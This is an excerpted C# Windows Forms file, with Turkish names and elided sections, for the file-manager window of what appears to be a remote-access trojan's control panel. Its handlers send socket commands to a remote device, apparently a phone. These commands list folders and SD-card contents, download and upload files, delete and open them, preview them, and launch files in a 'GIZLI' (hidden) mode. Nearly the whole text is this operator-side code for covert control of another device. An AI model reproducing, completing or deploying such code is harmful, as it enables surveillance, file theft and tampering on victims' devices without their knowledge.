    ...
    public partial class FİleManager : Form
    {
        ...
        private void indirToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    ...
                    Form1.CommandSend("INDIR", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
            ...
            if (string.IsNullOrEmpty(textBox.Text) == false)
            {
                ...
                })
                {
                    if (op.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            Form1.CommandSend("DOSYABYTE", "[VERI]"
        ...
        public void yenile()
        {
            if (textBox1.Text != "")
            {
                try
                {
                    Form1.CommandSend("FOLDERFILE", "[VERI]" + textBox1.Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        public void yenileSD()
        {
            if (textBox2.Text != "")
            {
                ...
                try
                {
                    Form1.CommandSend("FILESDCARD", "[VERI]" + textBox2.Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        ...
        private void sİlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Form1.CommandSend("DELETE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
        ...
        private void açToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Form1.CommandSend("DOSYAAC", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
                     listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        ...
        private void açToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Form1.CommandSend("DOSYAAC", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        ...
        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Form1.CommandSend("DELETE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        ...
        private void indirToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                ...
                {
                    toolStripProgressBar1.Style = ProgressBarStyle.Marquee; toolStripStatusLabel1.Text = "Downloading..";
                    Form1.CommandSend("INDIR", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
            ...
            if (listView1.SelectedItems.Count == 1)
            {
                ...
                else
                {
                    if (listView1.SelectedItems[0].ImageIndex == 0)
                    {
                        ...
                        try
                        {
                            Form1.CommandSend("FOLDERFILE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                        }
                        catch (Exception) { }
                    }
                }
            ...
            if (listView2.SelectedItems.Count == 1)
            {
                ...
                else
                {
                    if (listView2.SelectedItems[0].ImageIndex == 0)
                    {
                        ...
                        try
                        {
                            Form1.CommandSend("FILESDCARD", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                        }
                        catch (Exception) { }
                    }
                }
        ...
        private void başlatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    ...
                    {
                        Form1.CommandSend("GIZLI", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
                 listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                    }
                }
                catch (Exception) { }
        ...
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                ...
                {
                    Form1.CommandSend("PRE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
             listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
        ...
        private void listView2_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                ...
                {
                    Form1.CommandSend("PRE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                else { pictureBox1.Visible = false; }
                if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
                {
        ...
        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    ...
                    {
                        Form1.CommandSend("GIZLI", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                    }
                }
                catch (Exception) { }
            }
